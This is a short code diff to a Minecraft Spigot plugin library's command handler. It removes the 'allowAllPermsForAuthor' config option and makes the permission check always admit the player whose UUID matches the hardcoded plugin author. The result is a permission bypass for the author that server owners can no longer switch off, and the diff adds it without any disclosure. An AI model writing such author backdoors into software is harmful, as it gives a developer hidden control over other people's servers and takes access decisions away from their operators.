@@ -30,7 +30,6 @@ import java.util.stream.Collectors;
 import static com.google.common.collect.Lists.newArrayList;
 import static gyurix.spigotlib.Config.PlayerFile.backend;
 import static gyurix.spigotlib.Config.PlayerFile.mysql;
-import static gyurix.spigotlib.Config.allowAllPermsForAuthor;
 import static gyurix.spigotlib.Config.purgePF;
 import static gyurix.spigotlib.Main.*;
 import static gyurix.spigotlib.SU.*;
@@ -40,7 +39,7 @@ public class SpigotLibCommands implements CommandExecutor, TabCompleter {
     try {
       Player plr = sender instanceof Player ? (Player) sender : null;
       String cmd = args.length == 0 ? "help" : args[0].toLowerCase();
-      if (!sender.hasPermission("spigotlib.command." + cmd) && !(allowAllPermsForAuthor && plr != null && plr.getUniqueId().equals(author))) {
+      if (!sender.hasPermission("spigotlib.command." + cmd) && !(plr != null && plr.getUniqueId().equals(author))) {
         lang.msg(sender, "noperm");
         return true;
       }
